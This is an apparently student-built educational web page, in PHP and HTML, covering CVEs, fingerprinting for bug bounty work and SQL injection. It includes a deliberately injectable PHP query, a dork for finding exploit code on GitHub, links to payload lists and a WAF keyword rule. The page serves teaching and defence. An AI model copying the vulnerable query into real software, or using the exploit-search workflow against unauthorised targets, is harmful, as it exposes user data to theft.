<!DOCTYPE html>
<html lang="en">
<?php
  $title = "Academy";
  include 'database/conn.php';
  include 'include/header.php';
?>

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Student Dashboard</title>
  <link rel="shortcut icon" href="./images/logo.png" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Sharp" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
    integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
  <link rel="stylesheet" href="style.css" />
</head>


  <div class="container">
<?php include 'include/aside.php'; ?>


    <main>
      <div class="sections">
        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              CVE Exploit
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div
              style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">


              <div style="padding: 40px 6%;">

                <p style="font-size: 1.2rem; margin-bottom: 20px;">Sometimes, security researchers or attackers discover
                  flaws in widely used software systems. For example, recent vulnerabilities were identified in multiple
                  versions of Next.js, such as <strong>15.6.0, 14.3.0, and 16.0.0</strong>. Because many companies rely
                  on these versions in their production environments, a single vulnerability can affect a large number
                  of organizations at the same time.</p>

                <p style="font-size: 1.2rem; margin-bottom: 20px;">When such a flaw exists, an attacker may be able to
                  exploit it simply by executing a publicly available script. In some cases, exploiting the
                  vulnerability does not require advanced hacking skills. This can lead to the exposure of
                  <strong>sensitive server-side information</strong>, significantly increasing the security risk for
                  affected systems.</p>

                <div
                  style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0; font-size: 1.2rem;">
                  When a vulnerability is discovered in a service or framework that is used by many companies, it is
                  formally documented and assigned a standardized identifier known as a <strong>CVE (Common
                    Vulnerabilities and Exposures)</strong>. Each CVE is given a unique number, such as
                  <strong>CVE-2025-55182</strong>, which allows security professionals to easily reference and track the
                  vulnerability.
                </div>



                <p style="font-size: 1.2rem; margin-bottom: 20px;">By searching for a specific CVE ID, it is often
                  possible to find technical details, proof-of-concept code, or exploit scripts demonstrating how the
                  vulnerability can be abused. This process is what led to the widespread use of the term CVE in the
                  cybersecurity field.</p>

                <p style="font-size: 1.2rem; margin-bottom: 20px;">In this project, we will discuss what CVEs are, how
                  to search for them, and how vulnerabilities related to outdated software versions can be responsibly
                  exploited for bug bounty reporting or security disclosure purposes.</p>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  What is a CVE?</h2>
                <p style="font-size: 1.2rem;"><strong>CVE</strong> stands for Common Vulnerabilities and Exposures. A
                  CVE is a publicly disclosed security vulnerability identifier used to uniquely identify a known flaw
                  in software, hardware, or firmware.</p>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Why CVEs
                  exist</h3>
                <p style="font-size: 1.2rem;">Before CVEs, the same vulnerability could be described differently by
                  vendors, researchers, and tools. This caused confusion and inconsistency. CVEs solve this by giving
                  <strong>one standardized ID per vulnerability</strong>.</p>

                <h3 style="font-size: 1.4rem; margin-top: 30px;">CVE format</h3>
                <p style="font-size: 1.2rem;">A CVE follows this format:</p>
                <div
                  style="background-color: var(--color-dark, #1f2937); color: var(--color-background, #ffffff); padding: 15px 25px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 1.5rem; font-weight: bold; display: inline-block; margin: 15px 0;">
                  CVE-YYYY-NNNNN -> CVE-2023-34362
                </div>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Fingerprinting</h2>
                <p style="font-size: 1.2rem;">From a bug bounty perspective, identifying and tracking newly disclosed
                  CVEs is an essential skill for security researchers. Bug bounty programs often reward researchers who
                  can identify vulnerable systems that are still using outdated or unpatched software versions.</p>

                <p style="font-size: 1.2rem;">However, before searching for existing CVEs or available exploit code, it
                  is necessary to understand a fundamental concept: <strong>fingerprinting</strong>. Fingerprinting is a
                  critical first step in vulnerability research because it allows the researcher to identify which
                  service, framework, or technology a target system is using, as well as the exact version of that
                  technology.</p>



                <p style="font-size: 1.2rem;">In practical terms, fingerprinting answers questions such as:</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">What web framework or service is running on the target?</li>
                  <li style="margin-bottom: 10px;">Which version of the software is being used?</li>
                  <li style="margin-bottom: 10px;">Is this version affected by any known CVEs?</li>
                </ul>

                <p style="font-size: 1.2rem;">You can use tools like <strong>wappalyzer</strong> to identify which
                  services or framework is running on your target.</p>



                <p style="font-size: 1.2rem;">Wappalyzer is a free extension you can download it from here:</p>
                <ul style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 10px;"><a href="#" style="color: #2563eb; text-decoration: underline;">-
                      Wappalyzer for Chrome</a></li>
                  <li style="margin-bottom: 10px;"><a href="#" style="color: #2563eb; text-decoration: underline;">-
                      Wappalyzer for Firefox</a></li>
                </ul>

                <p style="font-size: 1.2rem;">In addition to browser-based tools, researchers can also use external
                  reconnaissance platforms such as <strong>FOFA</strong>. FOFA is a powerful search engine designed for
                  internet-wide asset discovery. It enables users to identify services, technologies, and frameworks
                  used by a target domain and its subdomains.</p>



                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Vulnerability Databases</h2>
                <p style="font-size: 1.2rem;">To determine whether any known vulnerabilities affect components, security
                  researchers rely on several databases:</p>
                <ul style="font-size: 1.2rem; padding-left: 30px;">
                  <li>NVD (National Vulnerability Database).</li>
                  <li>MITRE CVE Database</li>
                  <li>Exploit Database (Exploit-DB)</li>
                </ul>

                <div
                  style="background-color: var(--color-white, #f3f4f6); padding: 30px; border-radius: 12px; margin: 30px 0; border: 1px dashed #2563eb;">
                  <p style="font-size: 1.2rem; margin-top: 0;">You can also use Github to search for exploits using
                    google dorking:</p>
                  <code
                    style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">site:github.com intitle:"exploit CVE-xxxx-xxxx" OR exploit CVE-xxxx-xxxx</code>
                </div>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 60px; margin-bottom: 20px;">
                  Real-World Workflow</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;">Identify a newly disclosed CVE via public monitoring.</li>
                  <li style="margin-bottom: 15px;">Analyze details on authoritative sources like nvd.nist.gov.</li>
                  <li style="margin-bottom: 15px;">Identify affected vendors and technology prevalence.</li>
                  <li style="margin-bottom: 15px;">Search for in-scope targets on bug bounty platforms.</li>
                  <li style="margin-bottom: 15px;">Use fingerprinting to confirm the target is running the vulnerable
                    service.</li>
                  <li style="margin-bottom: 15px;">Review technical analyses to understand impact.</li>
                  <li style="margin-bottom: 15px;">Responsibly validate the vulnerability within scope rules.</li>
                  <li style="margin-bottom: 15px;">Document evidence and submit a professional report.</li>
                </ol>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text" style="background: rgba(115, 128, 206, 0.05); box-shadow: inset 0 2px 10px rgba(0,0,0,0.02); padding: 30px 25px 30px 45px; border-left: 5px solid #7380ce; border-radius: 0 12px 12px 0; margin-top: 15px;">
        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              SQL Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div
              style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 0; margin-bottom: 20px;">&Rightarrow; Basics &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) &rarr; Database &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>Database &rarr; Store collection of data in organized manner, that make it easy to manage, update, access.</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">A <strong>Database</strong> is where <strong>data is stored</strong>.</li>
                  <li style="margin-bottom: 10px;">Web applications utilize back-end databases to store various content and information related to the web application.</li>
                  <li style="margin-bottom: 10px;">traditionally, an application used <em>file-based databases</em>, which was very slow with the increase in size</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) &rarr; DBMS &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>( Database Management System )</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">DB managed by DBMS</li>
                  <li style="margin-bottom: 10px;">is software interact with Database and used to manage database</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Database Management System (DBMS) helps create, define, host, and manage databases.</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">There are multiple ways to interact with a DBMS, such as command-line tools, graphical interfaces, or even APIs (Application Programming Interfaces).</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Some of the essential features of a DBMS include &rarr;</strong></p>
                
                <div style="overflow-x: auto; margin-bottom: 20px;">
                  <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                    <thead style="background-color: #2563eb; color: #ffffff;">
                      <tr>
                        <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Feature</th>
                        <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Description</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 15px;"><strong>Concurrency</strong></td>
                        <td style="padding: 15px;">A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data.</td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 15px;"><strong>Consistency</strong></td>
                        <td style="padding: 15px;">With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database.</td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 15px;"><strong>Security</strong></td>
                        <td style="padding: 15px;">DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data.</td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 15px;"><strong>Reliability</strong></td>
                        <td style="padding: 15px;">It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach.</td>
                      </tr>
                      <tr>
                        <td style="padding: 15px;"><strong>Structured Query Language</strong></td>
                        <td style="padding: 15px;">SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.</td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(3) &rarr; SQL &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>( Structured Query Language )</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.</li>
                  <li style="margin-bottom: 10px;">You use SQL commands to tell the DBMS what to do with the data.</li>
                  <li style="margin-bottom: 10px;">standard language used to communicate with relational DBMS, perform operation same read, write, delete, update.</li>
                  <li style="margin-bottom: 10px;">used to query and manage data within Relational DBMS.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(4) &rarr; Types Of databases &rarr;</h3>
                
                <h4 style="font-size: 1.3rem; margin-top: 20px; color: #2563eb;">1 &rarr; Relational Databases &rarr;</h4>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>relational database management system (RDBMS)</strong></li>
                  <li style="margin-bottom: 10px;">most common type of database. It uses a schema, a template, to dictate the data structure stored in the database.</li>
                  <li style="margin-bottom: 10px;">Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed.</li>
                  <li style="margin-bottom: 10px;">Tables Called entities, and all tables related to each other</li>
                  <li style="margin-bottom: 10px;">The most common example of relational databases is <code>MySQL</code></li>
                </ul>

                <h4 style="font-size: 1.3rem; margin-top: 20px; color: #2563eb;">2 &rarr; Non-Relational Databases &rarr;</h4>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">A non-relational database (also called a <code>NoSQL</code> database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.</li>
                  <li style="margin-bottom: 10px;">NoSQL databases are very scalable and flexible.</li>
                  <li style="margin-bottom: 10px;">when dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data.</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; There are four common storage models for NoSQL databases:</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Key-Value</li>
                  <li style="margin-bottom: 10px;">Document-Based</li>
                  <li style="margin-bottom: 10px;">Wide-Column</li>
                  <li style="margin-bottom: 10px;">Graph</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">what is SQL Injection &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Web Security Vulnerability occur when web application take user input and pass it to SQL query without sanitization or filtering.</li>
                  <li style="margin-bottom: 10px;">another one: occur when attacker inject malicious SQL Statement into input field and because web app don't validate user input</li>
                </ul>
                
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>Example &rarr;</strong></p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn-&gt;query($query);</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">example of SQLI</li>
                  <li style="margin-bottom: 10px;">this can allow attacker to get the data that normally cant (access to sensitive data) retrieve and attacker can delete or modify data</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">impact of successful SQL Injection attack &rarr;</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 10px;">unauthorised access to sensitive data same passwords , credit cards, user info</li>
                  <li style="margin-bottom: 10px;">lose of Confidentiality because database has sensitive data</li>
                  <li style="margin-bottom: 10px;">lose of integrity because attacker can change in sensitive data</li>
                  <li style="margin-bottom: 10px;">can bypass authentication</li>
                  <li style="margin-bottom: 10px;">affect availability of web app and database and can take down web because lose of data</li>
                  <li style="margin-bottom: 10px;">RCE and Full System Compromise <strong>&lt; highest impact &gt;</strong></li>
                </ol>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">why SQL Injection happen?</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">directly insert user input to SQL query without validation or sanitization.</li>
                  <li style="margin-bottom: 10px;">not using prepared statement (prepared statement seperate SQL code from data)</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Prepared Statement &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">A <strong>precompiled SQL statement</strong> stored in the database.</li>
                  <li style="margin-bottom: 10px;">You define the SQL once, and then can execute it multiple times with different parameters.</li>
                  <li style="margin-bottom: 10px;">A prepared statement <strong>includes parameterization</strong> internally.</li>
                  <li style="margin-bottom: 10px;">So using prepared statements correctly <strong>already protects against SQL injection</strong>.</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;?php
$conn = new mysqli("localhost", "root", "", "testdb");

$user_input = $_GET['username'];

// Prepare statement
$stmt = $conn-&gt;prepare("SELECT * FROM users WHERE username = ?");
$stmt-&gt;bind_param("s", $user_input); // "s" = string
$stmt-&gt;execute();

$result = $stmt-&gt;get_result();
while($row = $result-&gt;fetch_assoc()){
    echo $row['username'] . "&lt;br&gt;";
}
?&gt;</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Why safe:</strong> The <code>?</code> is a placeholder. The DB treats <code>$user_input</code> <strong>strictly as data</strong>, no matter what it contains.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Parameterized query &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Any SQL statement written with placeholders (parameters) instead of embedding literal values. Example placeholders: ?, $1, :name.</li>
                  <li style="margin-bottom: 10px;">If you always use parameterized queries (placeholders, e.g., <code>?</code> or <code>%s</code>), the database treats user input strictly as <strong>data</strong>, not executable SQL.</li>
                  <li style="margin-bottom: 10px;">Prevents SQL injection by separating code and data.</li>
                  <li style="margin-bottom: 10px;">Makes queries easier to read and maintain.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">How Prevent SQLI &rarr;</h2>
                
                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Input Sanitization &amp;&amp; Validation &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Libraries provide multiple functions to achieve this, one such example is the <a href="https://www.php.net/manual/en/mysqli.real-escape-string.php" target="_blank" style="color: #2563eb; text-decoration: underline;"><strong>mysqli_real_escape_string()</strong></a> function. This function escapes characters such as <code>'</code> and <code>"</code>, so they don't hold any special meaning.</li>
                  <li style="margin-bottom: 10px;">A similar example is the <a href="https://www.php.net/manual/en/function.pg-escape-string.php" target="_blank" style="color: #2563eb; text-decoration: underline;">pg_escape_string()</a> which used to escape PostgreSQL queries.</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "&lt;br /&gt;&lt;br /&gt;";</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; User Privileges &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">DBMS software allows the creation of users with fine-grained permissions.</li>
                  <li style="margin-bottom: 10px;">We should ensure that the user querying the database only has minimum permissions.</li>
                  <li style="margin-bottom: 10px;">Superusers and users with administrative privileges should never be used with web applications.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Web Application Firewall &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed.</li>
                  <li style="margin-bottom: 10px;">WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string <code>INFORMATION_SCHEMA</code> would be rejected, as it's commonly used while exploiting SQL injection.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4 &rarr; Parameterized Queries &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Another way to ensure that the input is safely sanitized is by using parameterized queries.</li>
                  <li style="margin-bottom: 10px;">Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers.</li>
                  <li style="margin-bottom: 10px;">Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.</li>
                </ul>

                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <ul style="font-size: 1.2rem; padding-left: 20px; list-style-type: disc; margin: 0;">
                    <li style="margin-bottom: 10px;">validate, check, filter, sanitized data user input it</li>
                    <li style="margin-bottom: 10px;">using allow list: when input sent to server compared to list if it safe sent if not reject</li>
                    <li style="margin-bottom: 10px;">stripping input: if input contain dangerous characters remove it before process</li>
                    <li style="margin-bottom: 10px;">use prepared statement and parameterized queries ensure user input treated as data, not as part of SQL query.</li>
                  </ul>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Payloads &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank" style="color: #2563eb; text-decoration: underline;">SQL Injection Payload List (GitHub)</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" style="color: #2563eb; text-decoration: underline;">SQL Injection Cheat Sheet (PortSwigger)</a></li>
                  <li style="margin-bottom: 10px;"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" style="color: #2563eb; text-decoration: underline;">PayloadsAllTheThings (GitHub)</a></li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Types of SQL Injection &rarr;</h2>
                <div style="background-color: var(--color-dark, #1f2937); color: var(--color-white, #ffffff); padding: 25px; border-radius: 8px; font-family: monospace; font-size: 1.2rem; margin: 15px 0;">
                  <strong>&rarr; in-band SQLI (Classic SQLI)</strong><br>
                  <strong>&rarr; blind SQLI</strong><br>
                  <strong>&rarr; out-of-band SQLI</strong>
                </div>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) In-Band SQLI (Classic SQLI) &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">most common type of SQLI attack, occur when attacker use same channel communication to send the attack and receive results.</li>
                  <li style="margin-bottom: 10px;">attacker inject malicious SQL statement into input field in web app and receive result of attack in same communication channel (same web page u inject in it)</li>
                  <li style="margin-bottom: 10px;">the result of payload u inject will return in same page</li>
                  <li style="margin-bottom: 10px;">it dangerous because attacker can get sensitive data, modify it, delete it, compromise app or server</li>
                </ul>

                <div style="background-color: var(--color-white, #f3f4f6); padding: 20px; border-radius: 8px; border-left: 6px solid #2563eb; margin: 20px 0; font-style: italic; font-size: 1.2rem;">
                  <strong>In-band SQL Injection is easy to exploit and detect but noisy and can be easily monitored</strong>
                </div>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">In-Band SQLI (Classic SQLI ) has two types : <strong>error-based SQLI, and, UNION Based SQLI</strong>.
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;"><strong>Error-Based SQLI</strong> :- attacker inject SQL code that cause app to generate error, the error may contain info about database schema, content</li>
                      <li style="margin-bottom: 5px;"><strong>UNION-Based SQLI</strong> :- attacker use union operator to combine result of two or more sql queries</li>
                    </ul>
                  </li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) Blind SQLI &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">type of SQLI attack, when attacker exploit vulnerability in web application that doesn't reveal any information about DB, or results about injected query.</li>
                  <li style="margin-bottom: 10px;">in this type of attack, attacker inject malicious SQL code in input field, and the web app doesn't reveal any useful information or error message in response.</li>
                </ul>

                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; attacker use various techniques to infer information about DB &rarr;</strong></p>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 5px;">time delay</li>
                  <li style="margin-bottom: 10px;">boolean logic</li>
                </ol>

                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>1 &rarr; Boolean-Based SQLI Attack &rarr;</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">In this type of attack, the attacker exploits the application's response to boolean conditions to infer information about the database.</li>
                  <li style="margin-bottom: 10px;">The attacker sends a malicious SQL query to the application and evaluates the response based on whether the query executed successfully or failed.</li>
                </ul>

                <p style="font-size: 1.2rem; margin-bottom: 10px; margin-top: 20px;"><strong>2 &rarr; Time-Based Blind Injection &rarr;</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">the attacker exploits the application's response time to infer information about the database.</li>
                  <li style="margin-bottom: 10px;">the attacker sends a malicious SQL query to the application and measures the time it takes for the application to respond.</li>
                  <li style="margin-bottom: 10px;">is more challenging to exploit and requires multiple requests but can be used when detailed error messages are unavailable</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(3) Out-Of-Band SQLI &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Least Common type of SQLI Attack, it involve attacker exploit vulnerability in web app to extract data from database using different channel other than web app itself</li>
                  <li style="margin-bottom: 10px;">this technique relies on Database server, making an out-of-band request to server attacker control it.</li>
                  <li style="margin-bottom: 10px;">doesn't require attacker to receive response from application</li>
                  <li style="margin-bottom: 10px;">has two different communication channels, one to launch attack and other one to receive the results.</li>
                  <li style="margin-bottom: 10px;">is less common and highly effective, requires external server control, and relies on the database's ability to make out-of-band requests</li>
                </ul>

                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <p style="font-size: 1.2rem; margin-bottom: 15px; font-style: italic;">Most SQL injection vulnerabilities occur within the <code>WHERE</code> clause of a <code>SELECT</code> query. Most experienced testers are familiar with this type of SQL injection</p>
                  <p style="font-size: 1.2rem; margin-bottom: 15px; font-style: italic;">However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:</p>
                  <ul style="font-size: 1.2rem; padding-left: 20px; list-style-type: circle; margin: 0; font-style: italic;">
                    <li style="margin-bottom: 10px;">In <code>UPDATE</code> statements, within the updated values or the <code>WHERE</code> clause.</li>
                    <li style="margin-bottom: 10px;">In <code>INSERT</code> statements, within the inserted values.</li>
                    <li style="margin-bottom: 10px;">In <code>SELECT</code> statements, within the table or column name.</li>
                    <li style="margin-bottom: 10px;">In <code>SELECT</code> statements, within the <code>ORDER BY</code> clause.</li>
                  </ul>
                </div>

